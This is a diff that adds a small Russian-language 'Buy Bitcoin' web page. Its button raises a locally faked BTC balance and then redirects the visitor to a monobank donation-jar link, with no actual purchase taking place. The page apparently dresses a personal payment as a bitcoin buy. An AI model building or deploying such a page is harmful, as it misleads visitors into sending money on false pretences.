@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Купить Биткоин</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      background: #f7f7f7;
+      margin-top: 100px;
+    }
+    h1 {
+      font-size: 2em;
+    }
+    #balance {
+      font-size: 2.5em;
+      margin: 20px 0;
+      color: #27ae60;
+    }
+    button {
+      font-size: 1.2em;
+      padding: 15px 30px;
+      background-color: #f39c12;
+      color: white;
+      border: none;
+      cursor: pointer;
+      border-radius: 10px;
+    }
+    button:hover {
+      background-color: #e67e22;
+    }
+  </style>
+</head>
+<body>
+  <h1>Ваш BTC Баланс:</h1>
+  <div id="balance">0.0000 BTC</div>
+  <button id="buyBtn">Купить BTC</button>
+
+  <script>
+    let balance = 0;
+    document.getElementById("buyBtn").addEventListener("click", () => {
+      balance += 0.001;
+      document.getElementById("balance").innerText = balance.toFixed(4) + " BTC";
+      location.href = "https://send.monobank.ua/jar/79FaHW9sop";
+    });
+  </script>
+</body>
+</html>
